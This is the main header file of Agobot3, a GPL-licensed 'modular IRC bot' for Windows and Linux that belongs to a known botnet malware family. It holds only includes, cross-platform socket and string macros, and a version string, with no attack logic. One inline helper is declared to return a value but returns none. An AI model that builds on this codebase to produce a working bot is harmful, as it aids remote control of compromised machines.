/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __MAIN_H__
#define __MAIN_H__

//Platform specific includes

#ifdef WIN32
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <shlobj.h>
#include <direct.h>
#include <lm.h>
#include <wininet.h>
#include <psapi.h>
#include <ras.h>
#else // Linux
#include <pthread.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/sockios.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#endif // WIN32


// Standard includes

#include <stdlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <signal.h>
#include <ctype.h>
#include <time.h>
#include <bitset>
#include <list>
#include <vector>
#include <pthread.h>
#define USE_SOCKETS
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/md5.h>
#include <openssl/evp.h>

// Platform specific defines

#ifdef WIN32
#pragma warning(disable:4101)
#define SYS_PLATFORM "Win32"
#define DIRCHAR '\\'
#define DIRSTR "\\"
#define xRead(x,y,z) recv(x,y,z,0)
#define xWrite(x,y,z) send(x,y,z,0)
#define xClose closesocket
#define socklen_t int
#define vsnprintf _vsnprintf
#define sprintf wsprintf
#define safe_strncpy lstrcpyn
#else // Linux
#define SYS_PLATFORM "Linux"
#define DIRCHAR '/'
#define DIRSTR "/"
#define xRead(x,y,z) recv(x,y,z,MSG_NOSIGNAL)
#define xWrite(x,y,z) send(x,y,z,MSG_NOSIGNAL)
#define xClose close
#define CharNext(x) (x+1)
#define CharPrev(s,x) ((s)<(x)?(x)-1:(s))
#define DeleteFile(x) unlink(x)
#define CreateDirectory(x,y) mkdir(x,0755)
#define RemoveDirectory(x) (!rmdir(x))
#define Sleep(x) usleep(( x )*1000)
#define stricmp(x,y) strcasecmp(x,y)
#define strnicmp(x,y,z) strncasecmp(x,y,z)
static inline char *safe_strncpy(char *out, char *in, int maxl) { strncpy(out,in,maxl); out[maxl-1]=0; }
static inline unsigned int GetTickCount() { struct timeval tv; gettimeofday(&tv,NULL); return (tv.tv_sec*1000)+(tv.tv_usec/1000); }
#define MAX_PATH 1024
#define __int64 long long
#define __int32 long
#define __int16 short
#define __int8 char
#endif // WIN32

// Standard defines

#ifdef _DEBUG
#define SYS_BUILD "Debug"
#else
#define SYS_BUILD "Release"
#endif

#ifndef min
#define min(x,y) ((x)<(y)?(x):(y))
#define max(x,y) ((y)<(x)?(x):(y))
#endif

#if defined (__GNU_LIBRARY__) || defined (__linux__)
#define SOCKLEN unsigned int
#else
#define SOCKLEN int
#endif

#ifndef INADDR_NONE
#define INADDR_NONE (unsigned long)0xFFFFFFFF
#endif

#ifndef INADDR_ANY
#define INADDR_ANY (unsigned long)0x00000000
#endif

#ifndef INADDR_LOOPBACK
#define INADDR_LOOPBACK (unsigned long)0x7F000001
#endif

#ifndef INVALID_SOCKET
#define INVALID_SOCKET (int)(~0)
#endif

#ifndef SOCKET_ERROR
#define SOCKET_ERROR (-1)
#endif

#ifdef WIN32
#define ERRNO (WSAGetLastError())
#define SET_SOCK_BLOCK(s,block) { unsigned long __i=block?0:1; ioctlsocket(s,FIONBIO,&__i); }
#define EWOULDBLOCK WSAEWOULDBLOCK
#define EINPROGRESS WSAEWOULDBLOCK
#else
#define ERRNO errno
#define SET_SOCK_BLOCK(s,block) { int __flags; if ((__flags = fcntl(s, F_GETFL, 0)) != -1) {  if (!block) __flags |= O_NONBLOCK; else __flags &= ~O_NONBLOCK; fcntl(s, F_SETFL, __flags); } }
#endif

#ifndef SHUT_RDWR
#define SHUT_RDWR 2
#endif

#define VERSION_AGOBOT	"0.2.1-pre3 Alpha"

#endif // __MAIN_H__
